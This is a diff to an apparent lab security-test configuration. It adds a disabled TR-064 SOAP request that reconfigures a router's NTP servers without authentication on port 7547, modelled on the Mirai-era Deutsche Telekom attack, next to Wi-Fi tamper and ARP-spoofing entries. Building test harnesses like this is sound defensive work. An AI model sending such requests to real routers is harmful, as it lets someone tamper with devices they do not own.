@@ -206,6 +206,26 @@ attacks:
     body: "ssid=capex-test&wpa_psk=capex-test-tamper"
     timeout_seconds: 5
 
+  # Impact #2 (#94) - TR-064 SOAP config-injection. Real, publicly
+  # documented attack: in late 2016 Mirai variants exploited the TR-064
+  # SOAP endpoint (/UD/act?1, CVE-2016-10372-adjacent pattern) to issue
+  # unauthenticated device-restart/reconfigure commands over port 7547,
+  # in the incident that knocked ~900k Deutsche Telekom routers offline.
+  # Also left disabled by default - real exploit against real router/
+  # gateway firmware, needs per-device vetting before enabling.
+  - name: config_tamper_tr064_soap
+    label: Config_Tamper_TR064_SOAP
+    kind: config_tamper
+    enabled: false
+    repeats: 1
+    port: 7547
+    path: /UD/act?1
+    method: POST
+    content_type: 'text/xml; charset="utf-8"'
+    soap_action: "urn:dslforum-org:service:Time:1#SetNTPServers"
+    body: "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>pool.ntp.org</NewNTPServer1></u:SetNTPServers></s:Body></s:Envelope>"
+    timeout_seconds: 5
+
   # ARP Spoofing / MITM (#82)
   # interface/gateway_ip are placeholders - verify these match the actual
   # lab NIC and router address before enabling.
